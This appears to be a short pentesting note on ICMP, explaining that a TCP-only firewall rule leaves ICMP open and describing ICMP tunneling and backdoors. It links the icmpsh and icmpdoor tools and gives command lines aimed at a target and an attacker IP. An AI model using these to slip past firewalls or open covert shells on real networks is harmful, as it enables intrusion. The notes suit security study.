## Why ICMP can work

- Your firewall rule (`BlockOutboundDC`) **only blocks TCP** (as shown in your `Get-NetFirewallRule` output).
    
- ICMP (Internet Control Message Protocol) is **not TCP or UDP**; it’s a separate protocol used for things like `ping`, `traceroute`, and network diagnostics.
    
- Many firewalls **allow ICMP echo request/reply by default**, unless explicitly blocked.


# ICMP (Internet Control Message Protocol)

**`Default Port: Not applicable`**

**ICMP (Internet Control Message Protocol)** is a network layer protocol used by network devices, including routers, to send error messages and operational information indicating success or failure when communicating with another IP address. It is commonly used for diagnostics and troubleshooting in IP networks.

ICMP operates by exchanging control messages between devices, informing them about network conditions, errors, and various other operational states.



[[ping]]

## ICMP Tunneling

https://github.com/bdamele/icmpsh
https://github.com/krabelize/icmpdoor


ICMP Tunneling involves encapsulating other network protocols within ICMP packets to bypass network security measures:

```
icmpsh -t <target-ip>
```

### ICMP Backdoor

Creating a backdoor using ICMP can provide a covert channel for communication:

```
icmpsh -b <attacker-ip>
```


